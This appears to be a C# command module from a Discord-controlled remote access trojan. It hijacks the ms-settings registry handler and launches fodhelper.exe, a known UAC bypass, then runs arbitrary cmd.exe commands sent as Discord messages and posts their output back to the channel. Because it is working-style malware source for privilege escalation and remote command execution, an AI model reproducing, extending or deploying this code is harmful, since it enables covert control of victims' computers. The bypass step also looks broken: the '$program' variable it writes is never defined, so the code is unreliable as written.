using System;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using Helper;

namespace Commands
{
    public static class UACShell
    {
        private static readonly string[] NotUsableCommands = { "tasklist", "powershell.exe", "fodhelper.exe" };

        public static async Task Run(SocketUserMessage message, string[] args)
        {
            if (NotUsableCommands.Contains(args[0]) || string.Join(" ", args).Length > 2000)
            {
                Embed embed = new SerpentEmbed().GetEmbed(SerpentEmbeds.Warning, "", $"Command `{args[0]}` can't be used due to its big output size.");
                await message.ReplyAsync(embed: embed);
                return;
            }

            string powershellScript = @"
                New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
                New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
                Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value $program -Force
            ";

            ProcessStartInfo powershellInfo = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = powershellScript,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            try
            {
                Process powershellProcess = new Process { StartInfo = powershellInfo };
                powershellProcess.Start();
                powershellProcess.WaitForExit();

                ProcessStartInfo fodHelperInfo = new ProcessStartInfo
                {
                    FileName = "fodhelper.exe",
                    UseShellExecute = true
                };

                Process fodHelperProcess = new Process { StartInfo = fodHelperInfo };
                fodHelperProcess.Start();
                fodHelperProcess.WaitForExit();

                ProcessStartInfo cmdInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/C " + string.Join(" ", args),
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true
                };

                await Task.Run(async () =>
                {
                    Process cmdProcess = new Process { StartInfo = cmdInfo };
                    cmdProcess.Start();
                    cmdProcess.WaitForExit();

                    string output = await cmdProcess.StandardOutput.ReadToEndAsync();
                    string errOutput = await cmdProcess.StandardError.ReadToEndAsync();
                    string result = string.IsNullOrEmpty(output) ? errOutput : output;
                    string finalResult = string.IsNullOrEmpty(result) ? "None" : result;

                    Embed embedToSend = new SerpentEmbed().GetEmbed(SerpentEmbeds.Success, $"Result of {args[0]}", $"```py\n{finalResult}```");
                    await message.ReplyAsync(embed: embedToSend);
                });
            }
            catch (Exception e)
            {
                Console.WriteLine("Error.");
            }
        }
    }
}
